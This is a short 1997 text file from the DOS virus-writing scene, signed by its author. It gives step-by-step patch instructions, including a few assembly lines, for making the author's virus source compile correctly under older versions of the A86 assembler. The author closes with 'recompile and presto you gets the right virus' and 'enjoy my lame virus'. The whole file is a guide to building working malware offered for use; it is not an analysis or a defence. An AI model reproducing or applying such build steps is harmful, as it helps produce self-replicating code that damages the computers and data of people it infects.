       ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
       ÄÄÄÄ Fix for A86 2.16 and prob'ly other versions below 4.xx ÄÄÄÄÄ
       ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

    first:

      delete line with "codlen equ ...." near start of code list

      replace all "codlen" with 01111
      replace all "offset _me_dta" with 02222
      replace all "offset _save-3" with 03333
      replace "mov offset _02+1,ax" with "mov w[04444],ax
      replace "mov _off,bx" with "mov w[05555],bx"
      replace "mov _seg,es" with "mov w[06666],es"

    next:

      insert the following lines immediately after "finis:"

         mov ax,((_finis-_is_me)+31)/16
         mov bx,offset _me_dta
         mov cx,offset _save-3
         mov dx,offset _02+1
         mov si,offset _off
         mov di,offset _seg

    then:

      place semicolons at start of line of "_who_me:" block
      like this:

        ;_who_me:and [bx+si+75h],dl
        ;        jz $+71h
        ;        db 6bh
        ;        jnb $+63h
        ;        and [bp+di+61h],cl
        ;        ja $+63h
        ;        jns $+63h
        ;        db 6eh

      and enter this

      _who_me db 020,050,075,074,06f,06b,073,061
              db 020,04b,061,077,061,079,061,06e


    then compile. load the com created in debug and get the right values.

    then

         replace all 01111 with value of ???? in "mov ax,????"
         replace all 02222 with value of ???? in "mov bx,????"
         replace all 03333 with value of ???? in "mov cx,????"
         replace all 04444 with value of ???? in "mov dx,????"
         replace all 05555 with value of ???? in "mov si,????"
         replace all 06666 with value of ???? in "mov di,????"


    recompile and presto you gets the right virus.

     _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
     _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_

                              enjoy my lame virus

                                       =)

                                Putoksa Kawayan
                                  Philippines
                                      1997
